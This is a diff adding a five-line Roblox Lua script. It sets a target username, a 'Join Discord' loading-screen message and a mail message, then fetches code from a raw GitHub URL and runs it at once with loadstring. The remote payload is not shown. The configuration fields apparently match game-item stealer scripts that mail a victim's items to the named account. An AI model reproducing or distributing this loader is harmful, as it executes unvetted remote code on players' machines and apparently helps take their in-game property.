@@ -1,0 +1,5 @@
+Username = "o1te2WltM08zgt1x1"
+G_LoadingScreen = "Join Discord"
+G_Mailmessage = "Imbest"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ownqa/test/main/wefwef.txt"))()
